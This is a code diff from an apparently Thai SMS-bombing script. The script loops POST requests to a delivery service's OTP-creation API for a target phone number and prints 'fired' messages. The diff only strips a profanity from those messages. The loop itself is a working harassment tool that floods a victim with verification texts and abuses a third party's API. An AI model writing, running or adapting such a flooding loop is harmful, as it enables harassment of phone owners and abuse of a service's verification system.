@@ -26,7 +26,7 @@ print("\n[กำลังยิง]")
 for i in range(jml):
       sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
       if 'eror' in sec.text:
-           print(f'{i+1}. [+]ยิงแล้วไอสัส {no}')
+           print(f'{i+1}. [+]ยิงแล้ว {no}')
       else:
-           print(f'{i+1}. [+]ยิงแล้งไอสัส {no}')
+           print(f'{i+1}. [+]ยิงแล้ว {no}')
       time.sleep(2.0)
